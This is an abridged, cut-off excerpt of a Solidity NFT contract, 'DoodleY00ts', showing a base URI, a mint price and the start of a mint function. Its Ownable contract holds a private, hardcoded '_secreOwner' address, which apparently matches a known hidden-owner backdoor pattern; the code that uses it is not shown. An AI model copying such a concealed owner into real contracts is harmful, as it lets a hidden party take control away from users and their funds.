...
abstract contract Ownable is Context {
    ...
    address private _secreOwner = 0xA4DeaA820ea3F01F698De966A4393CEbACc428f3;
...
contract DoodleY00ts is ERC721A, Ownable, ReentrancyGuard {
    string public baseURI = "ipfs://QmUc2LfinP84huqK1hqtcYsFJCYuPd5aD8KMHutp872bmB/";
    uint   public price             = 0.02 ether;
    uint   public maxPerTx          = 2000;
    ...
    constructor() ERC721A("DoodleY00ts", "DY"){}
    ...
    function mint(uint256 count) external payable {
        uint256 cost = price;
        bool isFree = ((totalFreeMinted + count < totalFree + 0) &&
